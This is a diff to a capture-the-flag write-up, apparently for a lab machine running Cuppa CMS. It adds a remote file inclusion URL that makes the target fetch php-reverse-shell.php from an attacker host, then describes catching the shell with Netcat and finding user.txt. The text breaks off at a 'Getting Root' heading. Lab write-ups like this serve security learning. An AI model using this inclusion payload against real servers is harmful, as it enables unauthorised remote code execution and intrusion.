@@ -392,5 +392,16 @@ http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]
 
 The final command will be as followed: 
 ```
-http://10.10.116.36/45kra24zxs28v3yd/administrator/cuppa/alerts/alertConfigField.php?urlConfig=[FI]
+http://10.10.116.36/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.2.143:9090/php-reverse-shell.php
 ```
+
+## Getting a shell
+Immediately after running the exploit in the browser URL, we get a reverse shell in our Netcat listener 
+![[Pasted image 20251022194552.png]]
+
+# Further Enumeration
+After browsing through the webserver, we identify the home directory and the user milesdyson, we can now view the contents of the directory and we identify the user.txt
+![[Pasted image 20251022194716.png]]
+
+# Getting Root
+How 
